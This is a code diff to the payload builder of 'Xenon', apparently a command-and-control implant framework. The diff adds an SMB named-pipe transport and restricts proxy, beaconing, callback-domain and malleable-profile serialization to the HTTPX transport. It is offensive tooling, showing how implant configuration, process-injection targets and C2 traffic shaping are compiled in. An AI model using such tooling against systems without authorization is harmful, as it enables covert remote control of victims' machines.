@@ -97,6 +97,8 @@ class XenonAgent(PayloadType):
             "proxy_host": "",
             "proxy_user": "",
             "proxy_pass": "",
+            # SMB only
+            "pipename": ""
         }
         stdout_err = ""
         for c2 in self.c2info:
@@ -106,7 +108,7 @@ class XenonAgent(PayloadType):
             selected_profile = c2_profile.get('name')
             logging.info(f"[+] {selected_profile} C2 Profile Selected!")
             
-            # Set each key value from HTTPX profile in Config dictionary
+            # Set each key value from C2 profile in Config dictionary
             for key, val in c2.get_parameters_dict().items():
                 # Check for encryption
                 if isinstance(val, dict) and 'enc_key' in val:  # enc_key is base64(value)
@@ -260,27 +262,29 @@ class XenonAgent(PayloadType):
             if Config["encryption"]:
                 serialized_data += serialize_string(Config["aes_key"])
 
-            # Serialize proxy settings
-            serialized_data += serialize_bool(Config["proxyEnabled"])
-            if Config["proxyEnabled"]:
-                serialized_data += serialize_string(Config["proxy_host"])
-                serialized_data += serialize_string(Config["proxy_user"])
-                serialized_data += serialize_string(Config["proxy_pass"])
+            # HTTPX Specific
+            if selected_profile == 'httpx':
+                # Serialize proxy settings
+                serialized_data += serialize_bool(Config["proxyEnabled"])
+                if Config["proxyEnabled"]:
+                    serialized_data += serialize_string(Config["proxy_host"])
+                    serialized_data += serialize_string(Config["proxy_user"])
+                    serialized_data += serialize_string(Config["proxy_pass"])
 
-            # Serialize sleep time and jitter
-            serialized_data += serialize_int(Config["callback_interval"])  # Sleep time
-            serialized_data += serialize_int(Config["callback_jitter"])    # Jitter
-            
-            # Serialize domain rotation and failover threshold
-            rotation_strategies = {
-                "round-robin": 0,
-                "fail-over": 1,
-                "random": 2
-            }
-            strategy = Config.get("domain_rotation", "fail-over")
-            domain_rotation_value = rotation_strategies.get(strategy)
-            serialized_data += serialize_int(domain_rotation_value)
-            serialized_data += serialize_int(Config["failover_threshold"])
+                # Serialize sleep time and jitter
+                serialized_data += serialize_int(Config["callback_interval"])  # Sleep time
+                serialized_data += serialize_int(Config["callback_jitter"])    # Jitter
+                
+                # Serialize domain rotation and failover threshold
+                rotation_strategies = {
+                    "round-robin": 0,
+                    "fail-over": 1,
+                    "random": 2
+                }
+                strategy = Config.get("domain_rotation", "fail-over")
+                domain_rotation_value = rotation_strategies.get(strategy)
+                serialized_data += serialize_int(domain_rotation_value)
+                serialized_data += serialize_int(Config["failover_threshold"])
 
             # Process Injection Settings
             spawnto_process_path = self.get_parameter('spawnto_process')
@@ -289,30 +293,37 @@ class XenonAgent(PayloadType):
             inject_pipe_name = self.get_parameter('default_pipename')
             serialized_data += serialize_string(inject_pipe_name)
 
-            # Serialize number of hosts (callback domains)
-            num_hosts = len(Config["callback_domains"])
-            serialized_data += serialize_int(num_hosts)
+            # HTTPX Specific
+            if selected_profile == 'httpx':
+                # Serialize number of hosts (callback domains)
+                num_hosts = len(Config["callback_domains"])
+                serialized_data += serialize_int(num_hosts)
 
-            # Serialize each callback domain
-            for url in Config["callback_domains"]:
-                # Parse the URL to get hostname, port, and SSL flag
-                if url.startswith("https://"):
-                    ssl = True
-                    url_without_scheme = url[len("https://"):]
-                elif url.startswith("http://"):
-                    ssl = False
-                    url_without_scheme = url[len("http://"):]
-                else:
-                    raise ValueError("Invalid URL scheme")
+                # Serialize each callback domain
+                for url in Config["callback_domains"]:
+                    # Parse the URL to get hostname, port, and SSL flag
+                    if url.startswith("https://"):
+                        ssl = True
+                        url_without_scheme = url[len("https://"):]
+                    elif url.startswith("http://"):
+                        ssl = False
+                        url_without_scheme = url[len("http://"):]
+                    else:
+                        raise ValueError("Invalid URL scheme")
 
-                # Split hostname and port
-                hostname, port = url_without_scheme.split(':')
-                port = int(port)
+                    # Split hostname and port
+                    hostname, port = url_without_scheme.split(':')
+                    port = int(port)
 
-                # Serialize hostname, port, and SSL flag
-                serialized_data += serialize_string(hostname)
-                serialized_data += serialize_int(port)
-                serialized_data += serialize_bool(ssl)
+                    # Serialize hostname, port, and SSL flag
+                    serialized_data += serialize_string(hostname)
+                    serialized_data += serialize_int(port)
+                    serialized_data += serialize_bool(ssl)
+
+            # SMB Specific
+            if selected_profile == 'smb':
+                serialized_data += serialize_string(Config["pipename"])
+                
 
             # Convert to hex string format for C macro
             general_config_hex = ''.join(f'\\x{byte:02X}' for byte in serialized_data)
@@ -322,6 +333,10 @@ class XenonAgent(PayloadType):
             
             with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
                 content = f.read()
+                
+                # Set the selected transport profile
+                profile_define_string = f"{selected_profile.upper()}_TRANSPORT"     # HTTPX_TRANSPORT | SMB_TRANSPORT
+                content = content.replace("%C2_PROFILE%", profile_define_string)
 
                 # Stamp in hex byte array
                 content = content.replace("%S_AGENT_CONFIG%", general_config_hex)              
@@ -332,52 +347,54 @@ class XenonAgent(PayloadType):
                 f.truncate()
                 
             
-            ##############################
-            #####     User-Agent      ####
-            ##############################
-            with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
-                content = f.read()
+            # HTTPX Specific 
+            if selected_profile == 'httpx':
+                ##############################
+                #####     User-Agent      ####
+                ##############################
+                with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
+                    content = f.read()
 
-                # Replace user agent for GET request (if defined, otherwise use default "Xenon")
-                get_user_agent = Config["raw_c2_config"]["get"]["client"]["headers"].get("User-Agent", "Xenon")
-                content = content.replace("%S_GET_USERAGENT%", get_user_agent)
+                    # Replace user agent for GET request (if defined, otherwise use default "Xenon")
+                    get_user_agent = Config["raw_c2_config"]["get"]["client"]["headers"].get("User-Agent", "Xenon")
+                    content = content.replace("%S_GET_USERAGENT%", get_user_agent)
 
-                # Replace user agent for POST request (if defined, otherwise use default "Xenon")
-                post_user_agent = Config["raw_c2_config"]["post"]["client"]["headers"].get("User-Agent", "Xenon")
-                content = content.replace("%S_POST_USERAGENT%", post_user_agent)
+                    # Replace user agent for POST request (if defined, otherwise use default "Xenon")
+                    post_user_agent = Config["raw_c2_config"]["post"]["client"]["headers"].get("User-Agent", "Xenon")
+                    content = content.replace("%S_POST_USERAGENT%", post_user_agent)
 
+                    
+                    # Write the updated content back to the file
+                    f.seek(0)
+                    f.write(content)
+                    f.truncate()
+
+
+                #############################################################################
+                #####     HTTP(X) request profiles ( in [Type, Size, Data] format)       ####
+                #############################################################################
                 
-                # Write the updated content back to the file
-                f.seek(0)
-                f.write(content)
-                f.truncate()
+                with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
+                    content = f.read()
 
-
-            #############################################################################
-            #####     HTTP(X) request profiles ( in [Type, Size, Data] format)       ####
-            #############################################################################
-            
-            with open(agent_build_path.name + "/Include/Config.h", "r+") as f:
-                content = f.read()
-
-                # Generate byte arrays for the malleable C2 profiles
-                get_client, post_client, get_server, post_server = generate_raw_c2_transform_definitions(Config["raw_c2_config"])
-                
-                content = content.replace("%S_C2_GET_CLIENT%", get_client)
-                content = content.replace("%S_C2_POST_CLIENT%", post_client)
-                content = content.replace("%S_C2_GET_SERVER%", get_server)
-                content = content.replace("%S_C2_POST_SERVER%", post_server)
-                
-                logging.info("Malleable C2 Profiles: \n")
-                logging.info(f'#define S_C2_GET_CLIENT "{get_client}"')
-                logging.info(f'#define S_C2_POST_CLIENT "{post_client}"')
-                logging.info(f'#define S_C2_GET_SERVER "{get_server}"')
-                logging.info(f'#define S_C2_POST_SERVER "{post_server}"')
-                
-                # Write the updated content back to the file
-                f.seek(0)
-                f.write(content)
-                f.truncate()
+                    # Generate byte arrays for the malleable C2 profiles
+                    get_client, post_client, get_server, post_server = generate_raw_c2_transform_definitions(Config["raw_c2_config"])
+                    
+                    content = content.replace("%S_C2_GET_CLIENT%", get_client)
+                    content = content.replace("%S_C2_POST_CLIENT%", post_client)
+                    content = content.replace("%S_C2_GET_SERVER%", get_server)
+                    content = content.replace("%S_C2_POST_SERVER%", post_server)
+                    
+                    logging.info("Malleable C2 Profiles: \n")
+                    logging.info(f'#define S_C2_GET_CLIENT "{get_client}"')
+                    logging.info(f'#define S_C2_POST_CLIENT "{post_client}"')
+                    logging.info(f'#define S_C2_GET_SERVER "{get_server}"')
+                    logging.info(f'#define S_C2_POST_SERVER "{post_server}"')
+                    
+                    # Write the updated content back to the file
+                    f.seek(0)
+                    f.write(content)
+                    f.truncate()
 
 
             ######################################
